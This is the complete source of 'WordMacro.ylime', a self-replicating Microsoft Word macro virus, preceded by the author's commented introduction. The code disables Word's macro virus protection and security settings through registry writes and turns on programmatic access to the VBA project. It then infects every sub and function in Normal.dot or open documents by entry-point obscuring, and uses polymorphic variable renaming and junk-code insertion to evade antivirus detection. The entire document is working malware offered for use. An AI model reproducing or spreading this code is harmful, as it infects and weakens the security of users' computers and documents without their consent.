'       hi, kids.  welcome to my newest creation: WordMacro.ylime.
'
'       ylime, or  "emily"  backwards, is  the  first macro  virus i've
'   written that i think is worth publishing (hello, EOF!), even though
'   it has not been tested properly.
'
'       the virus should  be able to infect documents regardless of the
'   version of microsoft word the  user has (8.0+).  this has only been
'   tested  on 8.0 and  11.0, but in  theory, it  should  work  on  all
'   versions.
'
'       ylime  uses a  new method  of infecting documents (i think – if
'   not, sue me :p): EPO (entry-point obscuring) mixed  with appending.
'   the  virus  searches  in  every  available  "vbcomponent"  for  its
'   signature (which  happens to be its  name) for the declaration of a
'   sub-routine or a function.
'
'       if found, the virus  places a call ("gosub" in vb = jmp in asm)
'   to  its code which is located  at the end of the  sub/function.  an
'   example of an infected procedure:
'
'       Private Function testProcedure()
'           GoSub ylimeStart
'
'           Dim variable1 As String
'           Dim variable2 As Integer
'
'           variable1 = "hello world!"
'           variable2 = 64
'    
'           MsgBox variable1, variable2, variable1
'
'           End
'
'       ylimeStart:
'            [ . . . ]
'       End Function
'
'       if there  is no  sub-routine or function  declared in  the code
'   module, then the virus creates its own sub, "document_open".  after
'   creating the sub, it adds its code along with a call to its code.
'
'       Private Sub document_open()
'           GoSub ylimeStart
'           End
'       ylimeStart:
'           [ . . . ]
'       End Sub
'
'       the  virus  also  uses  two  different  polymorphic  engines: a
'   garbage-code/comment  generator and  a slightly modified version of
'   NPE   to   change   its   variable   names   (thanks, Necro).   the
'   garbage-codes will be  a random variable  name with  a random value
'   (either  a number  or a string).  the garbage-comments will  either
'   start  with a ' or rem and will be followed by somewhere between 15
'   and  100   random  characters.  by  themselves,  these  polymorphic
'   engines won't accomplish much, but the two of them working together
'   should make a decent engine, imo.
'
'       i think that's all you need to know . . .
'
'                                                   kefi / detroit / 08
'

ylimeStart:
    Set vApplication = Application 'ylime
    Set vOptions = Options 'ylime
    Set vSystem = vApplication.System 'ylime
    If vApplication.Version = "8.0" Then 'ylime
        vSystem.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Options", "EnableMacroVirusProtection") = "0" 'ylime
        vOptions.VirusProtection = False 'ylime
        vOptions.SaveNormalPrompt = False 'ylime
    Else 'ylime
        vSystem.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\" & vApplication.Version & "\Word\Security", "Level") = &H1 'ylime
        vSystem.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\" & vApplication.Version & "\Word\Security", "AccessVBOM") = &H1 'ylime
    End If 'ylime
    Set vTDCodeModule = ThisDocument.VBProject.vbcomponents(1).codemodule 'ylime
    vTDCode = vTDCodeModule.Lines(1, vTDCodeModule.CountOfLines) 'ylime
    vYlimeCode = "" 'ylime
    For Each vCodeLine In Split(vTDCode, vbCrLf) 'ylime
        If vCodeLine Like "*ylime*" And Not vCodeLine = "GoSub ylimeStart" Then 'ylime
            GoSub takeOutTheTrash 'ylime
            If vYlimeCode = "" Then 'ylime
                If Not vGarbage = "" Then vYlimeCode = vGarbage & vbCrLf 'ylime
                vYlimeCode = vYlimeCode & vCodeLine & vbCrLf 'ylime
            Else 'ylime
                vYlimeCode = vYlimeCode & vCodeLine & vbCrLf 'ylime
                If Not vGarbage = "" Then vYlimeCode = vYlimeCode & vGarbage  'ylime
            End If 'ylime
        End If 'ylime
    Next 'ylime
    GoSub switchItUp 'ylime
    If vApplication.MacroContainer = NormalTemplate Then Set vDocument = ActiveDocument Else Set vDocument = NormalTemplate 'ylime
    For Each vDocComponent In vDocument.VBProject.vbcomponents 'ylime
        vDCCoL = vDocComponent.codemodule.CountOfLines 'ylime
        If vDCCoL > 3 Then 'ylime
            vDCCode = vDocComponent.codemodule.Lines(1, vDocComponent.codemodule.CountOfLines) 'ylime
            If Not vDCCode Like "*ylime*" Then 'ylime
                For Each vDCLine In Split(vDCCode, vbCrLf) 'ylime
                    If vDCLine Like "*Su" & "b *" Or vDCLine Like "*Func" & "tion *" Then 'ylime
                        vInfectedCode = vInfectedCode & vDCLine & vbCrLf & "gosub ylimeStart" & vbCrLf 'ylime
                    ElseIf vDCLine Like "End Sub*" Or vDCLine Like "End Function*" Then 'ylime
                        vInfectedCode = vInfectedCode & "end" & vbCrLf & vYlimeCode & vbCrLf & vDCLine 'ylime
                    Else 'ylime
                        vInfectedCode = vInfectedCode & vDCLine & vbCrLf 'ylime
                    End If 'ylime
                    GoSub takeOutTheTrash 'ylime
                    If Int(Rnd() * 3) = 2 Then vInfectedCode = vInfectedCode & vGarbage & vbCrLf
                Next 'ylime
            vDocComponent.codemodule.DeleteLines 1, vDocComponent.codemodule.CountOfLines 'ylime
            vDocComponent.codemodule.AddFromString vInfectedCode 'ylime
            End If 'ylime
        Else 'ylime
            vInfectedCode = "private s" & "ub document_open()" 'ylime
            vInfectedCode = vInfectedCode & vbCrLf & "gosub ylimeStart" & vbCrLf & "end" 'ylime
            vInfectedCode = vInfectedCode & vbCrLf & vYlimeCode & vbCrLf & "end s" & "ub" 'ylime
            vDocComponent.codemodule.AddFromString vInfectedCode 'ylime
        End If 'ylime
    Next 'ylime
    Return 'ylime
    
switchItUp: 'ylime
    Randomize 'ylime
    For Each vVariable In Split("vApplication:vOptions:vSystem:vTDCodeModule:vTDCode:vCodeLine:takeOutTheTrash:vYlimeCode:vGarbage:vDocument:vDocComponent:vDCCode:vInfectedCode:switchitup:vDCLine:vNewVariable:vVariable:vCodeLen:vCounter:vPOSofVar:vLeftOf:vRightOf:vDecider:vTMPVariable:vTMPValue", ":") 'ylime
        vNewVariable = "" 'ylime
        For vCounter = 1 To Int(Rnd() * 9) + 5 'ylime
            vNewVariable = vNewVariable & Chr(Int(Rnd() * 26) + 97) 'ylime
        Next 'ylime
        vCodeLen = Len(vYlimeCode) 'ylime
        While InStr(1, vYlimeCode, vVariable, vbTextCompare) 'ylime
            vPOSofVar = InStr(1, vYlimeCode, vVariable, vbTextCompare) 'ylime
            vLeftOf = Left(vYlimeCode, vPOSofVar - 1) 'ylime
            vRightOf = Mid(vYlimeCode, vPOSofVar + Len(vVariable), vCodeLen - vPOSofVar) 'ylime
            vYlimeCode = vLeftOf & vNewVariable & vRightOf 'ylime
        Wend 'ylime
    Next 'ylime
    Return 'ylime
    
takeOutTheTrash: 'ylime
    Randomize 'ylime
    vGarbage = "": vDecider = Int(Rnd() * 4) + 1 'ylime
    If vDecider = 1 Then 'ylime
        If Int(Rnd() * 2) + 1 = 2 Then vGarbage = "rem " Else vGarbage = "' " 'ylime
        For vCounter = 1 To Int(Rnd() * 85) + 15 'ylime
            vGarbage = vGarbage & Chr(Int(Rnd() * 26) + 97) 'ylime
        Next 'ylime
        vGarbage = vGarbage & vbCrLf 'ylime
    ElseIf vDecider = 2 Then 'ylime
        vTMPVariable = "": vTMPValue = 0 'ylime
        For vCounter = 1 To Int(Rnd() * 5) + 5 'ylime
            vTMPVariable = vTMPVariable & Chr(Int(Rnd() * 26) + 97) 'ylime
        Next 'ylime
        If Int(Rnd() * 2) + 1 = 2 Then 'ylime
            For vCounter = 1 To Int(Rnd() * 5) 'ylime
                vTMPValue = vTMPValue + (Rnd() * 23) 'ylime
            Next 'ylime
        Else 'ylime
            vTMPValue = Chr(34) 'ylime
            For vCounter = 1 To Int(Rnd() * 15) + 4 'ylime
                vTMPValue = vTMPValue & Chr(Int(Rnd() * 26) + 97) 'ylime
            Next 'ylime
            vTMPValue = vTMPValue & Chr(34) 'ylime
        End If 'ylime
        vGarbage = vTMPVariable & "=" & vTMPValue 'ylime
        vGarbage = vGarbage & vbCrLf 'ylime
    End If 'ylime
    Return 'wordmacro.ylime / kefi / detroit / 08

